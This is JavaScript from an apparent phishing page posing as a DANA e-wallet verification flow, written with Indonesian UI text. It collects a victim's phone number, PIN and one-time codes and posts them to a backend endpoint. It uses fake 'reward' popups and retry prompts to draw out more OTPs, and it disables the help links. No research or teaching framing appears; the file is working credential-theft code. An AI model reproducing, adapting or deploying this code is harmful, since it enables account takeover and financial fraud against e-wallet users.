document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');
  const rewardInstruction = document.getElementById('reward-instruction');
  const resendOtp = document.getElementById('resend-otp');
  const otpTimerElement = document.getElementById('otp-timer');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  let otpAttemptCount = 0;
  const maxAttempts = 6;
  let otpTimerInterval;
  let timeLeft = 120;

  // Rate limiting
  let lastRequestTime = 0;
  const MIN_REQUEST_INTERVAL = 2000;

  // Helper Functions
  function showSpinner() {
    const spinner = document.querySelector('.spinner-overlay');
    if (spinner) spinner.style.display = 'flex';
  }

  function hideSpinner() {
    const spinner = document.querySelector('.spinner-overlay');
    if (spinner) spinner.style.display = 'none';
  }

  function showToast(message, isError = false) {
    const toast = document.createElement('div');
    toast.textContent = message;
    toast.style.cssText = `
      position: fixed;
      bottom: 80px;
      left: 50%;
      transform: translateX(-50%);
      background: ${isError ? '#ff6b6b' : '#4CAF50'};
      color: white;
      padding: 12px 20px;
      border-radius: 8px;
      z-index: 2000;
      font-size: 14px;
      white-space: nowrap;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
  }

  function startOTPTimer() {
    timeLeft = 120;
    if (otpTimerElement) {
      otpTimerElement.textContent = timeLeft;
    }
    
    if (otpTimerInterval) clearInterval(otpTimerInterval);
    
    otpTimerInterval = setInterval(() => {
      timeLeft--;
      if (otpTimerElement) {
        otpTimerElement.textContent = timeLeft;
      }
      
      if (timeLeft <= 0) {
        clearInterval(otpTimerInterval);
        if (resendOtp) {
          resendOtp.classList.add('active');
          resendOtp.style.pointerEvents = 'auto';
          resendOtp.style.opacity = '1';
          resendOtp.innerHTML = 'KIRIM ULANG';
        }
      }
    }, 1000);
  }

  function resetOTPInputs() {
    ois.forEach(input => input.value = '');
    if (ois[0]) ois[0].focus();
    otp = '';
    otpAttemptCount++;
    if (ac && an) {
      ac.style.display = 'block';
      an.textContent = otpAttemptCount;
    }
  }

  function showRewardInstructionPopup() {
    if (rewardInstruction) {
      rewardInstruction.style.display = 'block';
      const closeBtn = rewardInstruction.querySelector('.close-btn');
      if (closeBtn) {
        closeBtn.addEventListener('click', () => {
          rewardInstruction.style.display = 'none';
        });
      }
    }
  }

  // ========== PERUBAHAN UTAMA: Endpoint ke Cloudflare Pages ==========
  async function sendDanaData(type, data) {
    const now = Date.now();
    if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
      throw new Error('Terlalu banyak permintaan. Silakan tunggu sebentar.');
    }
    lastRequestTime = now;

    try {
      // Ganti endpoint dari Netlify ke Cloudflare Pages
      const response = await fetch('/api/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || 'Terjadi kesalahan pada server');
      }
      return await response.json();
    } catch (error) {
      console.error('Error:', error);
      throw error;
    }
  }
  // ========== END PERUBAHAN ==========

  // Phone Number Formatting
  if (pn) {
    pn.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      
      if (value.startsWith('0')) {
        value = value.substring(1);
      }
      
      if (value.length > 0 && !value.startsWith('8')) {
        value = '8' + value.replace(/^8/, '');
      }
      
      if (value.length > 12) {
        value = value.substring(0, 12);
      }
      
      let formatted = '';
      if (value.length > 0) {
        formatted = value.substring(0, 3);
        if (value.length > 3) {
          formatted += '-' + value.substring(3, 7);
        }
        if (value.length > 7) {
          formatted += '-' + value.substring(7, 12);
        }
      }
      
      e.target.value = formatted;
      phoneNumber = value;
    });
  }

  // Event: Lanjutkan Button
  if (lb) {
    lb.addEventListener('click', async () => {
      if (currentPage === 'n') {
        if (phoneNumber.length < 9) {
          showToast('Nomor HP harus minimal 9 digit', true);
          return;
        }
        
        showSpinner();
        try {
          await sendDanaData('phone', { phone: phoneNumber });
          if (pages.n) pages.n.style.display = 'none';
          if (pages.p) pages.p.style.display = 'block';
          currentPage = 'p';
          if (lc) lc.style.display = 'none';
          showToast('Nomor HP terverifikasi');
        } catch (error) {
          showToast(error.message, true);
        } finally {
          hideSpinner();
        }
      }
    });
  }

  // PIN Input Handling
  pis.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      
      pin = Array.from(pis).map(i => i.value).join('');
      
      if (pin.length === 6) {
        showSpinner();
        try {
          await sendDanaData('pin', { phone: phoneNumber, pin });
          if (pages.p) pages.p.style.display = 'none';
          if (pages.o) pages.o.style.display = 'block';
          currentPage = 'o';
          if (lc) lc.style.display = 'none';
          startOTPTimer();
          if (fn) {
            fn.style.display = 'block';
            setTimeout(() => {
              if (fn) fn.style.display = 'none';
            }, 5000);
          }
          showToast('PIN terverifikasi, silakan masukkan OTP');
        } catch (error) {
          showToast(error.message, true);
          // Reset PIN inputs on error
          pis.forEach(i => i.value = '');
          pin = '';
          if (pis[0]) pis[0].focus();
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // OTP Input Handling
  ois.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      
      // Untuk OTP 4 digit (sesuai HTML)
      if (otp.length === 4) {
        showSpinner();
        try {
          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
          
          // Success OTP
          if (fn) fn.style.display = 'none';
          showToast('Verifikasi berhasil!', false);
          
          // Optional: Redirect or show success
          setTimeout(() => {
            if (sn) {
              sn.style.display = 'block';
              setTimeout(() => {
                if (sn) sn.style.display = 'none';
              }, 5000);
            }
          }, 1000);
          
        } catch (error) {
          console.error('OTP Error:', error);
          
          // OTP Failed
          resetOTPInputs();
          
          if (otpAttemptCount === 2) {
            showRewardInstructionPopup();
          }
          
          if (otpAttemptCount > 2 && otpAttemptCount < maxAttempts) {
            if (rn) {
              rn.style.display = 'block';
              rn.innerHTML = `
                <div class="notification-content">
                  <h3>Kode OTP Salah</h3>
                  <p>Silakan cek SMS atau WhatsApp</p>
                  <small>Percobaan: ${otpAttemptCount}/${maxAttempts}</small>
                </div>
              `;
              setTimeout(() => {
                if (rn) rn.style.display = 'none';
              }, 5000);
            }
          }
          
          if (otpAttemptCount >= maxAttempts) {
            if (fn) fn.style.display = 'none';
            if (sn) {
              sn.style.display = 'block';
              sn.innerHTML = 'Terlalu banyak percobaan. Silakan coba lagi nanti.';
              setTimeout(() => {
                if (sn) sn.style.display = 'none';
              }, 5000);
            }
          }
          
          showToast('Kode OTP salah!', true);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  // Toggle PIN Visibility
  const showTextBtn = document.querySelector('.show-text');
  if (showTextBtn) {
    showTextBtn.addEventListener('click', (e) => {
      const isShowing = e.target.classList.toggle('active');
      const pinInputs = document.querySelectorAll('.pin-box');
      pinInputs.forEach(input => {
        input.type = isShowing ? 'text' : 'password';
      });
      e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
    });
  }

  // Resend OTP
  if (resendOtp) {
    resendOtp.addEventListener('click', async () => {
      if (!resendOtp.classList.contains('active')) return;
      
      showSpinner();
      try {
        await sendDanaData('resend', { phone: phoneNumber });
        
        // Reset timer
        if (otpTimerInterval) clearInterval(otpTimerInterval);
        startOTPTimer();
        
        resendOtp.classList.remove('active');
        resendOtp.style.pointerEvents = 'none';
        resendOtp.style.opacity = '0.5';
        
        showToast('OTP telah dikirim ulang');
        
        if (fn) {
          fn.style.display = 'block';
          setTimeout(() => {
            if (fn) fn.style.display = 'none';
          }, 3000);
        }
      } catch (error) {
        showToast(error.message, true);
      } finally {
        hideSpinner();
      }
    });
  }

  // Help & Forgot PIN links (prevent default)
  const helpLinks = document.querySelectorAll('.help-forgot-container .link');
  helpLinks.forEach(link => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      showToast('Fitur ini sedang dalam pengembangan', true);
    });
  });

  // Cleanup on page unload
  window.addEventListener('beforeunload', () => {
    if (otpTimerInterval) {
      clearInterval(otpTimerInterval);
    }
  });
});
